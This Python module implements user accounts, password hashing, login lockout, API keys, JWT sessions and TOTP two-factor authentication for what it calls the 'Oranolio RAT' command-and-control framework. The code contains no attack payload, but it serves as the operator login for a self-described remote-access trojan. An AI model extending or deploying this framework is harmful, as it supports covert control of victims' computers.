#!/usr/bin/env python3
"""
Authentication Utilities for Oranolio RAT - Elite C2 Framework
Provides comprehensive authentication, authorization, and session management
"""

import os
import sys
import hashlib
import secrets
import time
import sqlite3
import logging
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List
from functools import wraps
from dataclasses import dataclass
import jwt
import pyotp
import qrcode
import io
import base64

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class User:
    """User data structure"""
    id: int
    email: str
    is_active: bool
    is_verified: bool
    created_at: datetime
    last_login: Optional[datetime] = None
    failed_login_attempts: int = 0
    locked_until: Optional[datetime] = None

@dataclass
class APIKey:
    """API Key data structure"""
    id: str
    user_id: int
    name: str
    key_hash: str
    permissions: List[str]
    created_at: datetime
    last_used: Optional[datetime] = None
    expires_at: Optional[datetime] = None
    is_active: bool = True
    usage_count: int = 0

class AuthenticationManager:
    """Manages user authentication and authorization"""
    
    def __init__(self, db_path: str = "data/email_auth.db"):
        self.db_path = db_path
        self.session_timeout = 3600  # 1 hour
        self.max_login_attempts = 5
        self.lockout_duration = 900  # 15 minutes
        self.jwt_secret = os.getenv('JWT_SECRET', secrets.token_urlsafe(32))
        self.jwt_algorithm = 'HS256'
        
        # Ensure database exists
        self._ensure_database()
    
    def _ensure_database(self):
        """Ensure the authentication database exists"""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Create users table if not exists
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                salt TEXT NOT NULL,
                is_active BOOLEAN DEFAULT 1,
                is_verified BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP,
                failed_login_attempts INTEGER DEFAULT 0,
                locked_until TIMESTAMP
            )
        ''')
        
        # Create API keys table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS api_keys (
                id TEXT PRIMARY KEY,
                user_id INTEGER NOT NULL,
                name TEXT NOT NULL,
                key_hash TEXT NOT NULL,
                permissions TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                expires_at TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                usage_count INTEGER DEFAULT 0,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        # Create login attempts table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS login_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                ip_address TEXT NOT NULL,
                success BOOLEAN NOT NULL,
                attempted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                user_agent TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def _hash_password(self, password: str, salt: str = None) -> tuple:
        """Hash a password with salt"""
        if salt is None:
            salt = secrets.token_hex(32)
        
        # Use PBKDF2 with SHA-256
        password_hash = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            salt.encode('utf-8'),
            100000  # 100,000 iterations
        )
        
        return password_hash.hex(), salt
    
    def _verify_password(self, password: str, password_hash: str, salt: str) -> bool:
        """Verify a password against its hash using constant-time comparison"""
        import hmac
        computed_hash, _ = self._hash_password(password, salt)
        # Use constant-time comparison to prevent timing attacks
        return hmac.compare_digest(computed_hash, password_hash)
    
    def create_user(self, email: str, password: str, full_name: str = None) -> bool:
        """Create a new user"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Check if user already exists
            cursor.execute("SELECT id FROM users WHERE email = ?", (email,))
            if cursor.fetchone():
                return False
            
            # Hash password
            password_hash, salt = self._hash_password(password)
            
            # Create user
            cursor.execute('''
                INSERT INTO users (email, password_hash, salt, created_at)
                VALUES (?, ?, ?, ?)
            ''', (email, password_hash, salt, datetime.now()))
            
            conn.commit()
            conn.close()
            
            logger.info(f"User created: {email}")
            return True
            
        except Exception as e:
            logger.error(f"Error creating user: {e}")
            return False
    
    def authenticate_user(self, email: str, password: str, ip_address: str = None, user_agent: str = None) -> Optional[User]:
        """Authenticate a user with email and password"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Get user data
            cursor.execute('''
                SELECT id, email, password_hash, salt, is_active, is_verified,
                       created_at, last_login, failed_login_attempts, locked_until
                FROM users WHERE email = ?
            ''', (email,))
            
            user_data = cursor.fetchone()
            if not user_data:
                self._log_login_attempt(email, ip_address, False, user_agent)
                return None
            
            user_id, email, password_hash, salt, is_active, is_verified, created_at, last_login, failed_attempts, locked_until = user_data
            
            # Check if account is locked
            if locked_until and datetime.now() < datetime.fromisoformat(locked_until):
                self._log_login_attempt(email, ip_address, False, user_agent)
                return None
            
            # Check if account is active
            if not is_active:
                self._log_login_attempt(email, ip_address, False, user_agent)
                return None
            
            # Verify password
            if not self._verify_password(password, password_hash, salt):
                # Increment failed attempts
                failed_attempts += 1
                if failed_attempts >= self.max_login_attempts:
                    locked_until = datetime.now() + timedelta(seconds=self.lockout_duration)
                    cursor.execute('''
                        UPDATE users SET failed_login_attempts = ?, locked_until = ?
                        WHERE id = ?
                    ''', (failed_attempts, locked_until, user_id))
                else:
                    cursor.execute('''
                        UPDATE users SET failed_login_attempts = ?
                        WHERE id = ?
                    ''', (failed_attempts, user_id))
                
                conn.commit()
                self._log_login_attempt(email, ip_address, False, user_agent)
                return None
            
            # Reset failed attempts and update last login
            cursor.execute('''
                UPDATE users SET failed_login_attempts = 0, locked_until = NULL, last_login = ?
                WHERE id = ?
            ''', (datetime.now(), user_id))
            
            conn.commit()
            conn.close()
            
            # Log successful login
            self._log_login_attempt(email, ip_address, True, user_agent)
            
            # Create user object
            user = User(
                id=user_id,
                email=email,
                is_active=bool(is_active),
                is_verified=bool(is_verified),
                created_at=datetime.fromisoformat(created_at) if created_at else datetime.now(),
                last_login=datetime.fromisoformat(last_login) if last_login else None
            )
            
            logger.info(f"User authenticated: {email}")
            return user
            
        except Exception as e:
            logger.error(f"Error authenticating user: {e}")
            return None
    
    def _log_login_attempt(self, email: str, ip_address: str, success: bool, user_agent: str = None):
        """Log a login attempt"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO login_attempts (email, ip_address, success, user_agent)
                VALUES (?, ?, ?, ?)
            ''', (email, ip_address, success, user_agent))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"Error logging login attempt: {e}")
    
    def create_api_key(self, user_id: int, name: str, permissions: List[str] = None, expires_in_days: int = 365) -> Optional[str]:
        """Create an API key for a user"""
        try:
            if permissions is None:
                permissions = ['read', 'write']
            
            # Generate API key
            api_key = secrets.token_urlsafe(32)
            key_hash = hashlib.sha256(api_key.encode()).hexdigest()
            
            # Calculate expiration
            expires_at = datetime.now() + timedelta(days=expires_in_days)
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Create API key record
            key_id = secrets.token_urlsafe(16)
            cursor.execute('''
                INSERT INTO api_keys (id, user_id, name, key_hash, permissions, expires_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (key_id, user_id, name, key_hash, ','.join(permissions), expires_at))
            
            conn.commit()
            conn.close()
            
            logger.info(f"API key created for user {user_id}: {name}")
            return api_key
            
        except Exception as e:
            logger.error(f"Error creating API key: {e}")
            return None
    
    def validate_api_key(self, api_key: str) -> Optional[User]:
        """Validate an API key and return the associated user"""
        try:
            key_hash = hashlib.sha256(api_key.encode()).hexdigest()
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Get API key and user data
            cursor.execute('''
                SELECT u.id, u.email, u.is_active, u.is_verified, u.created_at,
                       u.last_login, ak.permissions, ak.expires_at, ak.is_active
                FROM users u
                JOIN api_keys ak ON u.id = ak.user_id
                WHERE ak.key_hash = ? AND ak.is_active = 1
            ''', (key_hash,))
            
            result = cursor.fetchone()
            if not result:
                conn.close()
                return None
            
            user_id, email, is_active, is_verified, created_at, last_login, permissions, expires_at, key_active = result
            
            # Check if API key is expired
            if expires_at and datetime.now() > datetime.fromisoformat(expires_at):
                conn.close()
                return None
            
            # Update last used and usage count
            cursor.execute('''
                UPDATE api_keys SET last_used = ?, usage_count = usage_count + 1
                WHERE key_hash = ?
            ''', (datetime.now(), key_hash))
            
            conn.commit()
            conn.close()
            
            # Create user object
            user = User(
                id=user_id,
                email=email,
                is_active=bool(is_active),
                is_verified=bool(is_verified),
                created_at=datetime.fromisoformat(created_at) if created_at else datetime.now(),
                last_login=datetime.fromisoformat(last_login) if last_login else None
            )
            
            return user
            
        except Exception as e:
            logger.error(f"Error validating API key: {e}")
            return None
    
    def get_user_by_id(self, user_id: int) -> Optional[User]:
        """Get user by ID"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, email, is_active, is_verified, created_at, last_login,
                       failed_login_attempts, locked_until
                FROM users WHERE id = ?
            ''', (user_id,))
            
            user_data = cursor.fetchone()
            conn.close()
            
            if not user_data:
                return None
            
            user_id, email, is_active, is_verified, created_at, last_login, failed_attempts, locked_until = user_data
            
            return User(
                id=user_id,
                email=email,
                is_active=bool(is_active),
                is_verified=bool(is_verified),
                created_at=datetime.fromisoformat(created_at) if created_at else datetime.now(),
                last_login=datetime.fromisoformat(last_login) if last_login else None,
                failed_login_attempts=failed_attempts,
                locked_until=datetime.fromisoformat(locked_until) if locked_until else None
            )
            
        except Exception as e:
            logger.error(f"Error getting user by ID: {e}")
            return None

class SessionManager:
    """Manages user sessions"""
    
    def __init__(self, secret_key: str):
        self.secret_key = secret_key
        self.algorithm = 'HS256'
        self.session_timeout = 3600  # 1 hour
    
    def create_session_token(self, user: User) -> str:
        """Create a JWT session token for a user"""
        payload = {
            'user_id': user.id,
            'email': user.email,
            'iat': datetime.utcnow(),
            'exp': datetime.utcnow() + timedelta(seconds=self.session_timeout)
        }
        
        return jwt.encode(payload, self.secret_key, algorithm=self.algorithm)
    
    def validate_session_token(self, token: str) -> Optional[User]:
        """Validate a JWT session token and return the user"""
        try:
            payload = jwt.decode(token, self.secret_key, algorithms=[self.algorithm])
            user_id = payload.get('user_id')
            
            if not user_id:
                return None
            
            # Get user from database
            auth_manager = AuthenticationManager()
            return auth_manager.get_user_by_id(user_id)
            
        except jwt.ExpiredSignatureError:
            return None
        except jwt.InvalidTokenError:
            return None
        except Exception as e:
            logger.error(f"Error validating session token: {e}")
            return None

class MFAManager:
    """Manages Multi-Factor Authentication"""
    
    def __init__(self, db_path: str = "data/mfa_auth.db"):
        self.db_path = db_path
        self._ensure_database()
    
    def _ensure_database(self):
        """Ensure the MFA database exists"""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Create MFA settings table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS mfa_settings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                mfa_type TEXT NOT NULL CHECK (mfa_type IN ('totp', 'email', 'sms')),
                secret_key TEXT,
                backup_codes TEXT,
                is_enabled BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def setup_totp(self, user_id: int) -> tuple:
        """Setup TOTP for a user"""
        try:
            # Generate secret key
            secret = pyotp.random_base32()
            
            # Create TOTP object
            totp = pyotp.TOTP(secret)
            
            # Generate provisioning URI
            provisioning_uri = totp.provisioning_uri(
                name=f"user_{user_id}@oranolio.local",
                issuer_name="Oranolio RAT"
            )
            
            # Generate QR code
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(provisioning_uri)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            
            # Convert to base64
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            qr_code_base64 = base64.b64encode(buffer.getvalue()).decode()
            
            # Save to database
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT OR REPLACE INTO mfa_settings (user_id, mfa_type, secret_key, is_enabled)
                VALUES (?, ?, ?, ?)
            ''', (user_id, 'totp', secret, 0))
            
            conn.commit()
            conn.close()
            
            return secret, qr_code_base64
            
        except Exception as e:
            logger.error(f"Error setting up TOTP: {e}")
            return None, None
    
    def verify_totp(self, user_id: int, token: str) -> bool:
        """Verify a TOTP token"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT secret_key FROM mfa_settings
                WHERE user_id = ? AND mfa_type = 'totp' AND is_enabled = 1
            ''', (user_id,))
            
            result = cursor.fetchone()
            conn.close()
            
            if not result:
                return False
            
            secret_key = result[0]
            totp = pyotp.TOTP(secret_key)
            
            return totp.verify(token, valid_window=1)
            
        except Exception as e:
            logger.error(f"Error verifying TOTP: {e}")
            return False
    
    def enable_mfa(self, user_id: int, mfa_type: str) -> bool:
        """Enable MFA for a user"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE mfa_settings SET is_enabled = 1, updated_at = ?
                WHERE user_id = ? AND mfa_type = ?
            ''', (datetime.now(), user_id, mfa_type))
            
            conn.commit()
            conn.close()
            
            return True
            
        except Exception as e:
            logger.error(f"Error enabling MFA: {e}")
            return False

# Global instances
auth_manager = AuthenticationManager()
session_manager = SessionManager(os.getenv('JWT_SECRET', secrets.token_urlsafe(32)))
mfa_manager = MFAManager()

# Decorator functions
def login_required(f):
    """Decorator to require login for a route"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        from flask import session, redirect, url_for, request, jsonify
        
        # Check session
        if 'user_id' not in session:
            if request.is_json:
                return jsonify({'error': 'Authentication required'}), 401
            return redirect(url_for('auth.login'))
        
        # Validate session token if present
        token = session.get('session_token')
        if token:
            user = session_manager.validate_session_token(token)
            if not user:
                session.clear()
                if request.is_json:
                    return jsonify({'error': 'Invalid session'}), 401
                return redirect(url_for('auth.login'))
        
        return f(*args, **kwargs)
    return decorated_function

def api_key_or_login_required(f):
    """Decorator to require either API key or login"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        from flask import request, jsonify, session
        
        # Check for API key in header
        api_key = request.headers.get('X-API-Key')
        if api_key:
            user = auth_manager.validate_api_key(api_key)
            if user:
                g.current_user = user
                return f(*args, **kwargs)
        
        # Check session
        if 'user_id' in session:
            user_id = session['user_id']
            user = auth_manager.get_user_by_id(user_id)
            if user:
                g.current_user = user
                return f(*args, **kwargs)
        
        return jsonify({'error': 'Authentication required'}), 401
    return decorated_function

def track_failed_login(email: str, ip_address: str, user_agent: str = None):
    """Track a failed login attempt"""
    auth_manager._log_login_attempt(email, ip_address, False, user_agent)

def is_login_locked(email: str) -> bool:
    """Check if an email is locked due to too many failed attempts"""
    try:
        conn = sqlite3.connect(auth_manager.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT locked_until FROM users WHERE email = ?
        ''', (email,))
        
        result = cursor.fetchone()
        conn.close()
        
        if not result or not result[0]:
            return False
        
        locked_until = datetime.fromisoformat(result[0])
        return datetime.now() < locked_until
        
    except Exception as e:
        logger.error(f"Error checking login lock: {e}")
        return False

def get_lockout_time_remaining(email: str) -> int:
    """Get remaining lockout time in seconds"""
    try:
        conn = sqlite3.connect(auth_manager.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT locked_until FROM users WHERE email = ?
        ''', (email,))
        
        result = cursor.fetchone()
        conn.close()
        
        if not result or not result[0]:
            return 0
        
        locked_until = datetime.fromisoformat(result[0])
        remaining = (locked_until - datetime.now()).total_seconds()
        return max(0, int(remaining))
        
    except Exception as e:
        logger.error(f"Error getting lockout time: {e}")
        return 0

def clear_failed_login_attempts(email: str):
    """Clear failed login attempts for an email"""
    try:
        conn = sqlite3.connect(auth_manager.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE users SET failed_login_attempts = 0, locked_until = NULL
            WHERE email = ?
        ''', (email,))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        logger.error(f"Error clearing failed login attempts: {e}")

# API Key Manager
class APIKeyManager:
    """Manages API keys"""
    
    def __init__(self):
        self.auth_manager = auth_manager
    
    def create_key(self, user_id: int, name: str, permissions: List[str] = None) -> Optional[str]:
        """Create a new API key"""
        return self.auth_manager.create_api_key(user_id, name, permissions)
    
    def revoke_key(self, key_id: str) -> bool:
        """Revoke an API key"""
        try:
            conn = sqlite3.connect(self.auth_manager.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE api_keys SET is_active = 0 WHERE id = ?
            ''', (key_id,))
            
            conn.commit()
            conn.close()
            
            return True
            
        except Exception as e:
            logger.error(f"Error revoking API key: {e}")
            return False
    
    def list_keys(self, user_id: int) -> List[Dict[str, Any]]:
        """List API keys for a user"""
        try:
            conn = sqlite3.connect(self.auth_manager.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, name, permissions, created_at, last_used, expires_at, is_active, usage_count
                FROM api_keys WHERE user_id = ? ORDER BY created_at DESC
            ''', (user_id,))
            
            keys = []
            for row in cursor.fetchall():
                key_id, name, permissions, created_at, last_used, expires_at, is_active, usage_count = row
                keys.append({
                    'id': key_id,
                    'name': name,
                    'permissions': permissions.split(',') if permissions else [],
                    'created_at': created_at,
                    'last_used': last_used,
                    'expires_at': expires_at,
                    'is_active': bool(is_active),
                    'usage_count': usage_count
                })
            
            conn.close()
            return keys
            
        except Exception as e:
            logger.error(f"Error listing API keys: {e}")
            return []

# Global API key manager
api_key_manager = APIKeyManager()

# Example usage and testing
if __name__ == "__main__":
    logger.info("Authentication utilities ready!")